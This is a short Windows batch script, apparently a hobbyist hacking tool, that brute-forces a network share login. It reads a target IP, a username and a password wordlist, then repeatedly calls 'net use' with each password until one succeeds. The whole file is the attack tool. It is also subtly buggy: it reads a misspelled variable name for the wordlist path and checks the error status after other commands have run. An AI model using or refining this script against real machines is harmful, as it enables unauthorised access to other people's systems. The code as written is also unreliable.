@echo off
title IP Connect-Brute - By Dynamind
color A

echo " "
echo "-----------------------------------------"
echo "|    IP CONNECT BRUTE - BY DYNAMIND     |"
echo "-----------------------------------------"
echo " "

set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p wordlist="Enter Worldlist Location: "

set /a count=0
for /f %%a in (%worldlist%) do (
  set pass=%%a
  call :attempt
)
echo Password Not Found :(
pause
exit

:success
echo Password Found! %pass%
net use \\%ip% /d /y >nul 2>&1
pause
exit

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [ATTEMPT %count%]: %pass%
set /a count=%count%+1
if %errorlevel% EQU 0 goto success
